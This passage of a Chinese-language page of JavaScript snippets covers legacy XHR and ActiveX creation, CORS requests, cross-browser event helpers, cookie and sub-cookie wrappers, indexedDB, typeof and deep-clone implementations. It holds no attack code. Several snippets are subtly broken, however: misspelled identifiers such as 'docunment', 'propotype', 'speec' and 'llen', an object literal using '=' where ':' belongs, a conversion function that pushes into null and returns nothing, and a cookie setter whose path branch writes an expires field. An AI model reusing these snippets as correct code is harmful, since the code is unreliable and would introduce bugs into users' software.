href=\"#%E5%AF%B9%E8%B1%A1%E8%BD%AC%E6%8D%A2%E6%88%90%E6%95%B0%E7%BB%84\">对象转换成数组</a></li>\n<li><a href=\"#%E8%BF%94%E5%9B%9E%E6%8C%87%E5%AE%9A%E7%9A%84%E5%B1%9E%E6%80%A7\">返回指定的属性</a></li>\n<li><a href=\"#ele%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%8C%87%E5%AE%9A%E5%B1%9E%E6%80%A7\">ele是否存在指定属性</a></li>\n<li><a href=\"#ele%E6%98%AF%E5%90%A6%E7%AC%A6%E5%90%88%E9%80%89%E6%8B%A9%E5%99%A8selector\">ele是否符合选择器selector</a></li>\n<li><a href=\"#%E8%8E%B7%E5%8F%96%E5%86%85%E6%96%87%E6%9C%AC\">获取内文本</a></li>\n<li><a href=\"#%E8%8E%B7%E5%8F%96%E9%BC%A0%E6%A0%87%E4%BA%8B%E4%BB%B6%E7%9A%84%E7%88%B6%E5%85%83%E7%B4%A0\">获取鼠标事件的父元素</a></li>\n<li><a href=\"#%E6%8E%A2%E6%B5%8B%E6%8C%89%E7%9A%84%E6%98%AF%E9%BC%A0%E6%A0%87%E7%9A%84%E5%93%AA%E4%B8%AA%E9%94%AE\">探测按的是鼠标的哪个键</a></li>\n<li><a href=\"#%E9%BC%A0%E6%A0%87%E6%BB%9A%E5%8A%A8%E4%BA%8B%E4%BB%B6\">鼠标滚动事件</a></li>\n<li><a href=\"#%E6%8F%90%E5%8F%96%E9%80%89%E4%B8%AD%E7%9A%84%E6%96%87%E6%9C%AC\">提取选中的文本</a></li>\n<li><a href=\"#%E8%AE%BE%E7%BD%AE%E6%96%87%E6%9C%AC%E9%80%89%E4%B8%AD\">设置文本选中</a></li>\n<li><a href=\"#bind%E6%96%B9%E6%B3%95%E5%AF%B9%E8%80%81%E7%89%88%E6%9C%AC%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8\">bind方法对老版本的浏览器不起作用</a></li>\n<li><a href=\"#%E5%8C%85%E8%A3%85cookie\">包装cookie</a></li>\n<li><a href=\"#%E5%8C%85%E8%A3%85%E5%AD%90cookie\">包装子cookie</a></li>\n<li><a href=\"#indexedDB\">indexedDB</a></li>\n<li><a href=\"#%E6%89%8B%E5%86%99typeof\">手写typeof</a></li>\n<li><a href=\"#%E6%B7%B1%E5%BA%A6%E5%85%8B%E9%9A%86\">深度克隆</a></li>\n<li><a href=\"#%E7%BB%84%E5%90%88%E4%BD%BF%E7%94%A8%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1\">组合使用构造函数模式和原型模式创建对象</a></li>\n<li><a href=\"#%E7%BB%84%E5%90%88%E7%BB%A7%E6%89%BF\">组合继承</a></li>\n<li><a href=\"#%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F\">观察者模式</a></li>\n<li><a href=\"#%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE\">分享一个题目</a></li>\n</ul>\n<h2 id=\"添加多个onload事件\">添加多个onload事件</h2>\n<pre><code class=\"language-javascript\">function addLoadEvent(func){\n    var oldonload=window.onload;\n    if(typeof window.onload!= &#39;function&#39;){\n        window.onload=func;\n    }\n    else{\n        window.onload=function(){\n            oldonload();\n            func();\n        }\n    }\n\n}</code></pre>\n<h2 id=\"处理activexobjectxmlhttprequest问题\">处理ActiveXObject/XMLHttpRequest问题</h2>\n<pre><code class=\"language-javascript\">//第一种写法，《js高级程序设计》的写法  惰性载入技巧\nfunction createXHR(){\n    if(typeof XMLHttpRequest!=&quot;undefined&quot;){//XMLHttpRequest\n        createXHR=function(){\n            return new XMLHttpRequest();\n        };\n    }else if(typeof ActiveXObject!=&quot;undefined&quot;){//IE ActiveXObject\n        createXHR=function(){\n            if(typeof arguments.callee.activeXString!=&quot;string&quot;){\n                var versions=[&quot;MSXML2.XMLHttp.6.0&quot;,&quot;MSXML2.XMLHttp.3.0&quot;,&quot;MSXML2.XMLHttp&quot;],//IE\n                    i,len;\n                 for(i=0,len=versions.length;i&lt;len;i++){\n                    try{\n                        new ActiveXObject(versions[i]);\n                        arguments.callee.activeXString=version[i];\n                        break;\n                    }catch(ex){}\n                 }\n\n            }\n            return new ActiveXObject(arguments.callee.activeXString);\n        };\n    }else{\n        createXHR=function(){\n            throw new Error(&quot;fail&quot;);\n        }\n    }\n    return createXHR();\n}\n\n//第二种写法\nfunction createXHR(){\n    if(typeof XMLHttpRequest==&quot;undefined&quot;){\n        XMLHttpRequest= function () {\n            try{\n                return new ActiveXObject(&quot;Msxml2.XMLHTTP.6.0&quot;);\n            }\n            catch (e){}\n\n            try{\n                return new ActiveXObject(&quot;Msxml2.XMLHTTP.3.0&quot;);\n            }\n            catch (e){}\n\n            try{\n                return new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);\n            }\n            catch (e){}\n\n            return false;\n        }\n    }\n    return new XMLHttpRequest();\n}</code></pre>\n<h2 id=\"请求对象的属性和方法设置\">请求对象的属性和方法设置</h2>\n<pre><code class=\"language-javascript\">var xhr=createXHR();\nxhr.onreadystatechange=function(){//firfox引入onlaod，readyState==4时触发,代替onreadystatechange\n    if(xhr.readyState==4){\n        try{\n            if((xhr.status&gt;=200&amp;&amp;xhr.status&lt;300)||xhr.status==304){\n                alert(xhr.responseText);\n            }else {\n                alert(&quot;unsuccessful&quot;);\n            }\n        }catch(ex){}\n    }\n}\nxhr.onload=function(){\n    if((xhr.status&gt;=200&amp;&amp;xhr.status&lt;300)||xhr.status==304){\n                alert(xhr.responseText);\n            }else {\n                alert(&quot;unsuccessful&quot;);\n            }\n}\nxhr.onprogress=function(event){\n    if(event.lengthComputable){//进度信息是否可用\n        console.log(&quot;Received&quot;+event.position+&quot;of&quot;+event.totalSize);\n    }\n}\nxhr.onerror=function(){\n    alert(&quot;error&quot;);\n}\nxhr.timeout=1000;\nxhr.ontimeout=function(){\n    alert(&quot;timeout&quot;);\n}\nxhr.open(&quot;get&quot;,&quot;example.php&quot;,true);\nxhr.overrideMimeType(&quot;text/xml&quot;);\nxhr.send(null);//GET</code></pre>\n<h2 id=\"发送表单数据\">发送表单数据</h2>\n<pre><code class=\"language-javascript\">var form=document.getElementById(&quot;info&quot;);\nxhr.send(serialize(form));//第一种写法\nxhr.send(new FormData(form));//第二种写法</code></pre>\n<h2 id=\"跨浏览器的cors\">跨浏览器的CORS</h2>\n<pre><code class=\"language-javascript\">function createCORSRequest(method,url){\n    var xhr=new XMLHttpRequest();\n    if(&quot;withCredentials&quot; in xhr){\n        xhr.withCredentials = true;//默认情况下，这样的跨域无法带上目标域的会话（Cookies 等），需要设置xhr 实例的withCredentials 属性为true（IE 还不支持）\n        xhr.open(method,url,true);//第三个参数，true 表示异步，false 表示同步\n    }else if(typeof XDomainRequest !=&quot;undefined&quot;){\n        xhr=new XDomainRequest();\n        xhr.open(method,url);\n    }else {\n        xhr=null;\n    }\n    return xhr;\n}\nvar request=createCORSRequest(&quot;get&quot;,&quot;http://www.somewhere&quot;);\nif(request){\n    request.onload=function(){};// 请求成功后\n    request.send();\n}</code></pre>\n<h2 id=\"跨浏览器事件处理程序\">跨浏览器事件处理程序</h2>\n<pre><code class=\"language-javascript\">var eventUtil={\n    // 页面加载完成后\n    readyEvent : function(fn) {\n        if (fn==null) {\n            fn=document;\n        }\n        var oldonload = window.onload;\n        if (typeof window.onload != &#39;function&#39;) {\n            window.onload = fn;\n        } else {\n            window.onload = function() {\n                oldonload();\n                fn();\n            };\n        }\n    },\n\n    addEventHandler: function (obj, eventName, handler) {\n        if (document.attachEvent) {//IE\n            obj.attachEvent(&quot;on&quot; + eventName, handler);\n        } else if (document.addEventListener) {//DOM2级\n            obj.addEventListener(eventName, handler, false);//false- 默认。事件句柄在冒泡阶段执行\n        }\n        else{//DOM0级\n            obj[&#39;on&#39;+eventName]=handler;\n        }\n    },\n\n    removeEventHandler:function(obj, eventName, handler){\n        if (document.attachEvent) {//IE\n            obj.detachEvent(&quot;on&quot; + eventName, handler);\n        } else if (document.addEventListener) {//DOM2级\n            obj.removeEventListener(eventName, handler, false);\n        }\n        else{//DOM0级\n            obj[&#39;on&#39;+eventName]=null;\n        }\n    },\n   //获取event对象的引用，取到事件的所有信息，确保随时能使用event；\n    getEvent: function (e) {\n        var ev = e || window.event;\n        if (!ev) {\n            var c = this.getEvent.caller;\n            while (c) {\n                ev = c.arguments[0];\n                if (ev &amp;&amp; Event == ev.constructor) {\n                    break;\n                }\n                c = c.caller;\n            }\n        }\n        return ev;\n    },\n    //事件类型\n    getType: function (e) {\n        return e.type;\n\n    },\n    //调用事件的元素\n    getElement: function (e) {\n        return e.target|| e.srcElement;\n    },\n    //阻止默认事件\n    preventDefault: function (e) {\n        e= this.getEvent(e);\n        if(e.preventDefault){\n            e.preventDefault();\n        }\n        else {\n            return e.returnValue=false;//IE\n        }\n    },\n    //阻止冒泡\n    stopPropagation:function(e) {\n      if(e.stopPropagation){\n          e.stopPropagation();\n      }\n        else {\n          e.cancelBubble=true;//IE\n      }\n\n    },\n    //键盘事件键盘的编号\n    getCharCode:function (e){\n        if(typeof e.charCode==&quot;number&quot;)return e.charCode;\n        else return e.keyCode;\n    },\n    //获取剪贴板的文本\n    getClipbordText:function(e){\n        var clipboardData=(e.clipboardData||window.clipboardData);\n        return clipboardData.getData(&quot;text&quot;);\n    },\n    //设置剪贴板文本\n    setClipboardText:function(e,value){\n        if(e.clipboardData){\n            return e.clipboardData.setData(&quot;text/plain&quot;,value);\n        }else if(window.clipboardData){\n            return window.clipboardData.setData(&quot;text&quot;,value);\n        }\n    },\n\n}</code></pre>\n<h2 id=\"处理targetsrcelemnt问题，代替this\">处理target/srcelemnt问题，代替this</h2>\n<pre><code class=\"language-javascript\">function getActivatedObject(e) {\n    var obj;\n    if (!e) {\n        // early version of IE\n        obj = window.event.srcElement;\n    } else if (e.srcElement) {\n        // IE 7 or later\n        obj = e.srcElement;\n    } else {\n        // DOM Level 2 browser\n        obj = e.target;\n    }\n    return obj;\n}</code></pre>\n<h2 id=\"实现insertafter\">实现insertAfter</h2>\n<pre><code class=\"language-javascript\">/**\n * 把newElement插在targetElement后面 ,js的API只有insertBefore，没有insertAfter\n */\nfunction insertAfter(newElement,targetElement) {\n    var parent = targetElement.parentNode;\n    if (parent.lastChild == targetElement) {\n        parent.appendChild(newElement);\n    } else {\n        parent.insertBefore(newElement,targetElement.nextSibling);\n    }\n}</code></pre>\n<h2 id=\"给element加上类名\">给element加上类名</h2>\n<pre><code class=\"language-javascript\">function addClass(element,value) {\n    if (!element.className) {\n        element.className = value;\n    } else {\n        newClassName = element.className;\n        newClassName+= &quot; &quot;;\n        newClassName+= value;\n        element.className = newClassName;\n    }\n}</code></pre>\n<h2 id=\"判断是不是数组\">判断是不是数组</h2>\n<pre><code class=\"language-javascript\">function isArray(arg) {\n    //return Object.prototype.toString.call(arr)==&#39;[Object Array]&#39;;这种方法也可以\n    if (typeof arg == &#39;object&#39;) {\n        //所有数组都有一个包含单词&#39;arry&#39;的constructor,最后的i表示不区分大小写\n        var criteria = arg.constructor.toString().match(/array/i);\n        return (criteria != null);\n    }\n    return false;\n}</code></pre>\n<h2 id=\"ie10之前不支持docunmentgetelementbyclassname\">IE10之前不支持docunment.getElementByClassName</h2>\n<pre><code class=\"language-javascript\">function getByClass(clsName,parent){\n    if(docunment.getElementByClassName) return docunment.getElementByClassName(clsName);\n    //IE10之前\n    var oParent=parent?document.getElementById(parent):document,\n        eles=[],\n        elements=oParent.getElementsByTagName(&#39;*&#39;);\n\n    for(var i=0,l=elements.length;i&lt;l;i++){\n        if(elements[i].className==clsName){\n            eles.push(elements[i]);\n        }\n    }\n    return eles;\n}</code></pre>\n<h2 id=\"获取css样式\">获取css样式</h2>\n<pre><code class=\"language-javascript\">function getStyle(obj,attr){\n    if(obj.currentStyle) {//IE 浏览器\n        return obj.currentStyle[attr];\n    }else{//Firefox浏览器\n        return getComputedStyle(obj,false)[attr];\n    }\n}\n</code></pre>\n<h2 id=\"手写动画\">手写动画</h2>\n<p>多个属性同时运动需要用到JSON,并且所有运动达到目标值才能停止</p>\n<pre><code class=\"language-javascript\">//动画 startMove(oLi,{width:400,height:200,opacity:100})\nfunction startMove(obj,json,fn){\n    clearInterval(obj.timer);\n    obj.timer=setInterval(function () {\n        for(var attr in json){\n            //1.取当前的值\n            var cur=0;\n            if(attr==&#39;opacity&#39;){\n                cur=Math.round(parseFloat(getStyle(obj,attr))*100);\n            }\n            else {\n                cur=parseInt(getStyle(obj,attr));\n            }\n            //2.算速度\n            var speed=(json[attr]-cur)/8;\n            speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);\n            //3.检测停止\n            var flag=true;\n            if(cur!=json[attr]){//使得所有属性做完运动才结束\n                flag=false;\n            }\n            if(attr==&#39;opacity&#39;){\n                obj.style.filter=&#39;alpha(opacity:&#39;+(cur+speec)+&#39;)&#39;;\n                obj.style.opacity=(cur+speed)/100;\n            }\n            else{\n                obj.style[attr]=(cur+speed)+&#39;px&#39;;\n            }\n        }\n        if(flag){\n            clearInterval(obj.timer);\n            if(fn){\n                fn();\n            }\n        }\n    })\n}</code></pre>\n<h2 id=\"取得窗口左边和上边的位置\">取得窗口左边和上边的位置</h2>\n<pre><code class=\"language-javascript\">var leftPos=(typeof window.screenLeft ==&quot;number&quot;)?window.screenLeft:window.screenX;</code></pre>\n<h2 id=\"取得页面视口大小\">取得页面视口大小</h2>\n<pre><code class=\"language-javascript\">var pageWidth=window.innerWidth,\n    pageHeight=window.innerHeight;\n    if(typeof pageHeight!=&quot;number&quot;){\n        if(document.compatMode==&quot;CSS1Compat&quot;){//标准模式\n            pageHeight=window.documentElement.clientHeight;\n            pageWidth=window.documentElement.clientWidth;\n        }\n        else {//BackCompat\n            pageHeight=window.body.clientHeight;\n            pageWidth=window.body.clientWidth;\n        }\n    }</code></pre>\n<h2 id=\"检测插件方法\">检测插件方法</h2>\n<pre><code class=\"language-javascript\">/**\n *\n* 检测插件方法一，IE下无效\n*/\nfunction hasPlugin(name){\n    name=name.toLowerCase();\n    for(var i=0;i&lt;navigator.plugins.length;i++){\n        if(navigator.plugins[i].toLowerCase().indexOf(name)!=-1)\n        return true;\n    }\n    return false;\n}\n\n/**\n * 检测IE插件方法二 ,name是COM对象唯一标识符\n */\nfunction hasIEPlugin(name){\n    try{\n        new ActiveXObject(name);\n        return true;\n    }catch(ex){\n        return false;\n    }\n}</code></pre>\n<h2 id=\"获取元素\">获取元素</h2>\n<pre><code class=\"language-javascript\">function getElement(id){\n    if(document.getElementById){\n        return document.getElementById(id);\n    }else if(document.all){//IE5前\n        return document.all[id];\n    }else {\n        throw new Error(&quot;no way to retrieve element!&quot;);\n    }\n}</code></pre>\n<h2 id=\"检查对象的某个特性是否存在\">检查对象的某个特性是否存在</h2>\n<pre><code class=\"language-javascript\">function isHostMethod(object,property){\n    var t =typeof object[property];\n    return t==&quot;function&quot;||\n           (!!(t==&quot;object&quot;)&amp;&amp;object[property])||\n           t==&quot;unknown&quot;;//不懂\n}</code></pre>\n<h2 id=\"对象转换成数组\">对象转换成数组</h2>\n<pre><code class=\"language-javascript\">function convertToArray(nodes){\n    var array=null;\n    try{\n        array=Array.propotype.slice.call(nodes,0);//IE8前无效\n    }catch(ex){\n        for(var i=0,len=nodes.length;i&lt;len;i++){\n            array.push(nodes[i]);\n        }\n    }\n}</code></pre>\n<h2 id=\"返回指定的属性\">返回指定的属性</h2>\n<pre><code class=\"language-javascript\">/**\n * \n * 返回指定的属性 IE ele.attribute[]\n * Element.getAttribute()\n */\nfunction outputAttribute(ele){\n    var pairs=new Array(),\n        attrname,attrvalue,u,len;\n    for(i=0,len=ele.attribute.length;i&lt;len;i++){\n        attrname=ele.attributes[i].nodeName;\n        attrvalue=ele.attributes[i].nodeValue;\n        if(ele.attributes[i].specified){//IE\n            pairs.push(attrname+&#39;=\\&quot;&#39;+attrvalue+&#39;\\&quot;&#39;);\n        }\n    }\n}</code></pre>\n<h2 id=\"ele是否存在指定属性\">ele是否存在指定属性</h2>\n<pre><code class=\"language-javascript\">/**\n * \n * ele是否存在指定属性 attr\n */\nfunction hasattribute(ele,attr){\n    if(ele.hasAttribute){\n        return ele.hasAttribute(attr);\n    }else {//IE\n        return ele.attributes[attr].specified;\n    }\n}</code></pre>\n<h2 id=\"ele是否符合选择器selector\">ele是否符合选择器selector</h2>\n<pre><code class=\"language-javascript\">/**\n * ele是否符合选择器selector\n */\nfunction matchesSelector(ele,selector){\n    if(ele.matchesSelector){\n        return ele.matchesSelector(selector);\n    }else if(ele.msmatchesSelector){\n        return ele.msmatchesSelector(selector);\n    }else if(ele.mozmatchesSelector){\n        return ele.mozmatchesSelector(selector);\n    }else if(ele.webkitmatchesSelector){\n        return ele.webkitmatchesSelector(selector);\n    }else{\n        throw new Error(&quot;not support&quot;);\n    }\n}</code></pre>\n<h2 id=\"获取内文本\">获取内文本</h2>\n<pre><code class=\"language-javascript\">//innerText/textContent\nfunction getInnerText(ele){\n    return (typeof ele.innerText==&quot;string&quot;)?\n    ele.innerText:ele.textContent;\n}</code></pre>\n<h2 id=\"获取鼠标事件的父元素\">获取鼠标事件的父元素</h2>\n<pre><code class=\"language-javascript\">    function getRelatedTarget(e){\n        if(e.relatedTarget) return e.relatedTarget;\n        else if(e.fromElement) return e.fromElement;//mouseover\n        else if(e.toElement) return e.toElement;//mouseout\n        else return null;\n    }</code></pre>\n<h2 id=\"探测按的是鼠标的哪个键\">探测按的是鼠标的哪个键</h2>\n<pre><code class=\"language-javascript\"> function getButton(e){\n        if(document.implementation.hasFeature(&quot;MouseEvents&quot;,&quot;2.0&quot;)){\n            return e.button;\n        }else {\n            switch(e.button){\n                case 0 :\n                case 1:\n                case 3:\n                case 5:\n                case 7: return 0;\n                case 2:\n                case 6:return 2;\n                case 4:return 1;\n            }\n        }\n    }</code></pre>\n<h2 id=\"鼠标滚动事件\">鼠标滚动事件</h2>\n<pre><code class=\"language-javascript\"> //鼠标滚动，正数表示向上滚动\nfunction getWheelDelta(e){\n        if(e.wheelData){\n            return (client.engine.opera&amp;&amp;client.engine.opera&lt;9.5)?\n        -e.wheelData:e.wheelData;\n        }else {\n            return -e.detail*40;//firefox\n        }\n\n }\n</code></pre>\n<h2 id=\"提取选中的文本\">提取选中的文本</h2>\n<pre><code class=\"language-javascript\">function getSelectedText(textbox){\n    if(typeof selectionStart==&quot;number&quot;){\n        return textbox.value.subString(textbox.selectionStart,textbox.selectionEnd);\n    }else if(document.selection){//IE8之前没有selectionStart，selectionEnd属性\n        return document.selection.createRange().text;\n    }\n}</code></pre>\n<h2 id=\"设置文本选中\">设置文本选中</h2>\n<pre><code class=\"language-javascript\">function selectText(textbox,startIndex,stopIndex){\n    if(textbox.setSelectionRange){\n        textbox.setSelectionRange(startIndex,stopIndex);\n    }else if(textbox.createTextRange){//IE\n        var range=textbox.createTextRange();\n        range.collapse(true);\n        range.moveStart(&quot;character&quot;,0);\n        range.moveEnd(&quot;character&quot;,stopIndex-startIndex);\n        range.select();\n    }\n}</code></pre>\n<h2 id=\"bind方法对老版本的浏览器不起作用\">bind方法对老版本的浏览器不起作用</h2>\n<pre><code class=\"language-javascript\">\nFunction.prototype.bind = Function.prototype.bind || function(context){\n      var self = this;\n\n      return function(){\n        return self.apply(context, arguments);\n      };\n    }\n</code></pre>\n<h2 id=\"包装cookie\">包装cookie</h2>\n<pre><code class=\"language-javascript\">\n\n//cookie\nvar cookieUtil={\n    // 创建cookie\n    setcookie:function (name, value, expires, path, domain, secure) {\n    var cookieText = encodeURIComponent(name) + &#39;=&#39; + encodeURIComponent(value);\n    if (expires instanceof Date) {\n        cookieText += &#39;; expires=&#39; + expires.toGMTString();\n    }\n    if (path) {\n        cookieText += &#39;; path=&#39; + path;\n    }\n    if (domain) {\n        cookieText += &#39;; domain=&#39; + domain;\n    }\n    if (secure) {\n        cookieText += &#39;; secure&#39;;\n    }\n    document.cookie = cookieText;\n},\n    // 获取cookie\n    getcookie:function (name) {\n    var cookieName = encodeURIComponent(name) + &#39;=&#39;;\n    var cookieStart = document.cookie.indexOf(cookieName);\n    var cookieValue = null;\n    if (cookieStart &gt; -1) {\n        var cookieEnd = document.cookie.indexOf(&#39;;&#39;, cookieStart);\n        if (cookieEnd == -1) {\n            cookieEnd = document.cookie.length;\n        }\n        cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd));\n    }\n    return cookieValue;\n},\n   // 删除cookie\n    unsetcookie:function (name,path,domain,secure) {\n    this.setcookie(name,&quot;&quot;,new Date(0),path,domain,secure);\n}\n}</code></pre>\n<h2 id=\"包装子cookie\">包装子cookie</h2>\n<pre><code class=\"language-javascript\">//子cookie\nvar subcookieUtil={\n    get:function(name,subname){\n        var subcookie=getAll(name);\n        if(subcookie){\n            return subcookie[subname];\n        }else {\n            return null;\n        }\n    },\n    getAll:function(name){\n        var cookieName = encodeURIComponent(name) + &#39;=&#39;;\n        var cookieStart = document.cookie.indexOf(cookieName);\n        var cookieValue = null;\n        var subcookie,result={};\n        var len,i,parts;\n        if (cookieStart &gt; -1) {\n            var cookieEnd = document.cookie.indexOf(&#39;;&#39;, cookieStart);\n            if (cookieEnd == -1) {\n            cookieEnd = document.cookie.length;\n           }\n        cookieValue = document.cookie.substring(cookieStart + cookieName.length, cookieEnd);\n        if(cookieValue.length&gt;0){\n            subcookie=cookieValue.split(&#39;&amp;&#39;);\n            len=subcookie.length;\n            for(i=0;i&lt;llen;i++){\n                parts=subcookie[i].split(&#39;=&#39;);\n                result[parts[0]]=parts[1];\n            }\n            return result;\n        }\n       }\n    return null;\n    },\n\n    set:function (name, subname,value, expires, path, domain, secure) {\n        var subcookies=this.getAll(name)||{};\n        subcookies[subname]=value;\n        this.setAll(name,subcookies,expires,path,domain,secure);\n    },\n\n    setAll:function(name,subcookies,expires,path,domain,secure){\n        var cookieText = encodeURIComponent(name) + &#39;=&#39;;\n        var subcookiesParts=new Array();\n        var subname;\n        for(subname in subcookies){\n            if(subname.length&gt;0&amp;&amp;subcookies.hasOwnProperty(subname)){\n                subcookiesParts.push(encodeURIComponent(subname)+&#39;=&#39;+encodeURIComponent(subcookies[subname]));\n            }\n        }\n        if(subcookiesParts.length&gt;0){\n            cookieText+=subcookiesParts.join(&#39;&amp;&#39;);\n            if (expires instanceof Date) {\n                cookieText += &#39;; expires=&#39; + expires.toGMTString();\n            }\n            if (path) {\n                cookieText += &#39;; expires=&#39; + expires;\n             }\n            if (domain) {\n                cookieText += &#39;; domain=&#39; + domain;\n            }\n            if (secure) {\n                cookieText += &#39;; secure&#39;;\n            }\n        }\n\n        document.cookie = cookieText;\n    },\n    unset:function(name,subname,path,domain,secure){\n          var subcookies=this.getAll(name);\n        if(subcookies){\n              delete subcookies[subname];\n              this.setAll(name,subcookies,null,path,domain,secure);\n          }\n        },\n    unsetAll:function(name,path,domain,secure){\n          this.setAll(name,null,new Date(0),path,domain,secure);\n    }\n}</code></pre>\n<h2 id=\"indexeddb\">indexedDB</h2>\n<pre><code class=\"language-javascript\">\nvar indexedDB=window.indexedDB||window.mozIndexedDB||window.msIndexedDB||window.webkitIndexedDB;\nvar idbRequest=indexedDB.open(&#39;vvv&#39;);\nidbRequest.onsuccess=function(event){\n    database=event.target.result;\n}\nidbRequest.onerror=function(event){\n    alert(event.target.errorCode);\n}</code></pre>\n<h3 id=\"objectcreate\">Object.create</h3>\n<pre><code class=\"language-js\">var objectCreate = function(arg){\n    if(!arg){ return {}};\n    function obj(){};\n    obj.prototype = arg;\n    return new obj();\n}\nObject.create = Object.create||objectCreate;</code></pre>\n<h2 id=\"手写typeof\">手写typeof</h2>\n<pre><code class=\"language-javascript\">function type(obj) {\n    var toString = Object.prototype.toString;\n    var map = {\n        &#39;[object Boolean]&#39;  : &#39;boolean&#39;, \n        &#39;[object Number]&#39;   : &#39;number&#39;, \n        &#39;[object String]&#39;   : &#39;string&#39;, \n        &#39;[object Function]&#39; : &#39;function&#39;, \n        &#39;[object Array]&#39;    : &#39;array&#39;, \n        &#39;[object Date]&#39;     : &#39;date&#39;, \n        &#39;[object RegExp]&#39;   : &#39;regExp&#39;, \n        &#39;[object Undefined]&#39;: &#39;undefined&#39;,\n        &#39;[object Null]&#39;     : &#39;null&#39;, \n        &#39;[object Object]&#39;   : &#39;object&#39;\n    };\n    if(obj instanceof Element) {//因为对不同标签，toString会返回对应不同标签的构造函数\n        return &#39;element&#39;;\n    }\n    return map[toString.call(obj)];\n}</code></pre>\n<h2 id=\"使用useragent判断使用的是什么浏览器\">使用userAgent判断使用的是什么浏览器</h2>\n<p>360的兼容模式用的是IE、极速模式用的是chrome的内核</p>\n<pre><code class=\"language-javascript\"> function validB(){ \n  var u_agent = navigator.userAgent; \n  var B_name=&quot;Failed to identify the browser&quot;; \n  if(u_agent.indexOf(&quot;Firefox&quot;)&gt;-1){ \n      B_name=&quot;Firefox&quot;; \n  }else if(u_agent.indexOf(&quot;Chrome&quot;)&gt;-1){ \n      B_name=&quot;Chrome&quot;; \n  }else if(u_agent.indexOf(&quot;MSIE&quot;)&gt;-1&amp;&amp;u_agent.indexOf(&quot;Trident&quot;)&gt;-1){ \n      B_name=&quot;IE(8-10)&quot;;  \n  }\n    document.write(&quot;B_name:&quot;+B_name+&quot;&lt;br&gt;&quot;);\n    document.write(&quot;u_agent:&quot;+u_agent+&quot;&lt;br&gt;&quot;); \n} \n</code></pre>\n<h2 id=\"深度克隆\">深度克隆</h2>\n<pre><code class=\"language-javascript\">/**\n * \n * 深度克隆方法一，用的是instanceof\n */\nfunction clone(Obj) {\n    var buf;   \n    if (Obj instanceof Array) {\n        buf = [];  // 创建一个空的数组\n        var i = Obj.length;\n        while (i--) {\n            buf[i] = clone(Obj[i]);\n        }\n        return buf;\n    } else if (Obj instanceof Object){\n        buf = {};  // 创建一个空对象\n        for (var k in Obj) {  // 为这个对象添加新的属性\n            buf[k] = clone(Obj[k]);\n        }\n        return buf;\n    }else{\n        return Obj;\n    }\n}\n\n/**\n * \n * 深度拷贝方法二，用的是 toString\n */\nfunction deepClone(data) {\n    var t = type(data), o, i, ni;\n\n    if(t === &#39;array&#39;) {\n        o = [];\n    }else if( t === &#39;object&#39;) {\n        o = {};\n    }else {\n        return data;\n    }\n\n    if(t === &#39;array&#39;) {\n        for (i = 0, ni = data.length; i &lt; ni; i++) {\n            o.push(deepClone(data[i]));\n        }\n        return o;\n    }else if( t === &#39;object&#39;) {\n        for( i in data) {\n            o[i] = deepClone(data[i]);\n        }\n        return o;\n    }\n}\n/**\n * \n * 深度拷贝方法四，只支持基本数值类型\n * \n1.他无法实现对函数 、RegExp等特殊对象的克隆\n2.会抛弃对象的constructor,所有的构造函数会指向Object\n3.对象有循环引用,会报错\n */\nconst newObj = JSON.parse(JSON.stringify(oldObj));\n\n/**\n * \n * 深度拷贝方法三，更多类型\n */\n\nconst isType = (obj, type) =&gt; {\n  if (typeof obj !== &#39;object&#39;) return false;\n  const typeString = Object.prototype.toString.call(obj);\n  let flag;\n  switch (type) {\n    case &#39;Array&#39;:\n      flag = typeString === &#39;[object Array]&#39;;\n      break;\n    case &#39;Date&#39;:\n      flag = typeString === &#39;[object Date]&#39;;\n      break;\n    case &#39;RegExp&#39;:\n      flag = typeString === &#39;[object RegExp]&#39;;\n      break;\n    default:\n      flag = false;\n  }\n  return flag;\n};\n\nconst getRegExp = re =&gt; {\n  var flags = &#39;&#39;;\n  if (re.global) flags += &#39;g&#39;;\n  if (re.ignoreCase) flags += &#39;i&#39;;\n  if (re.multiline) flags += &#39;m&#39;;\n  return flags;\n};\n/**\n* deep clone\n* @param  {[type]} parent object 需要进行克隆的对象\n* @return {[type]}        深克隆后的对象\n*/\nconst clone = parent =&gt; {\n  // 维护两个储存循环引用的数组\n  const parents = [];\n  const children = [];\n\n  const _clone = parent =&gt; {\n    if (parent === null) return null;\n    if (typeof parent !== &#39;object&#39;) return parent;\n\n    let child, proto;\n\n    if (isType(parent, &#39;Array&#39;)) {\n      // 对数组做特殊处理\n      child = [];\n    } else if (isType(parent, &#39;RegExp&#39;)) {\n      // 对正则对象做特殊处理\n      child = new RegExp(parent.source, getRegExp(parent));\n      if (parent.lastIndex) child.lastIndex = parent.lastIndex;\n    } else if (isType(parent, &#39;Date&#39;)) {\n      // 对Date对象做特殊处理\n      child = new Date(parent.getTime());\n    } else {\n      // 处理对象原型\n      proto = Object.getPrototypeOf(parent);\n      // 利用Object.create切断原型链\n      child = Object.create(proto);\n    }\n\n    // 处理循环引用\n    const index = parents.indexOf(parent);\n\n    if (index != -1) {\n      // 如果父数组存在本对象,说明之前已经被引用过,直接返回此对象\n      return children[index];\n    }\n    parents.push(parent);\n    children.push(child);\n\n    for (let i in parent) {\n      // 递归\n      child[i] = _clone(parent[i]);\n    }\n\n    return child;\n  };\n  return _clone(parent);\n};\n\n</code></pre>\n<h2 id=\"组合使用构造函数模式和原型模式创建对象\">组合使用构造函数模式和原型模式创建对象</h2>\n<pre><code class=\"language-javascript\">//组合使用构造函数模式和原型模式创建对象\nfunction Person(name,age){\n    this.name=name;\n    this.age=age;\n    this.friends=[&quot;may&quot;,&quot;john&quot;];\n}\nPerson.prototype={\n    constructor:Person,//字面量形式的原型默认构造函数是object,所以在这里要指定constructor\n    sayName=function(){\n        alert(this.name);\n    }\n}</code></pre>\n<h2 id=\"组合继承\">组合继承</h2>\n<pre><code 